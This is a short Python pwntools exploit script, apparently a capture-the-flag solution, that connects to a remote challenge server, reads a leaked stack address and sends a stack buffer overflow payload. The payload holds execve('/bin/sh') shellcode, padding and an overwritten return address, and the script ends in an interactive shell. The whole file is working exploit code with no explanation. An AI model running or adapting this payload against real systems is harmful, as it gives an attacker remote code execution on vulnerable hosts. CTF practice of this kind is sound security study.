#!/usr/bin/env python3
from pwn import *

#target = process("./chall")
#gdb.attach(target, gdbscript="b fgets")
target = remote("tjc.tf", 31365)

stack = int(str(target.recvline())[2:-3], 16)
print(hex(stack))

payload = p64(0x0)
payload += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload += b"0" * (0x108 - len(payload))
payload += p64(stack + 0x8)

target.sendline(payload)

target.interactive()